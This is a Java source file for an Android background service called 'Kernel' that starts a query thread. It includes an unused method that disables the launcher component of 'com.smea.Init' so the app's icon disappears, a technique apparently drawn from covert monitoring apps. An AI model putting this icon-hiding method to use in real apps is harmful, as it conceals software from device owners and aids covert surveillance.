package com.androix;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class Kernel extends Service{

    private Context context;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {
        context = getApplicationContext();
        super.onCreate();
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        new Consultas(context, Kernel.this).start();

        return super.onStartCommand(intent, flags, startId);
    }

    private void hideApp() {
        ComponentName disable = new ComponentName("com.smea",
                "com.smea.Init");
        getPackageManager().setComponentEnabledSetting(disable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}
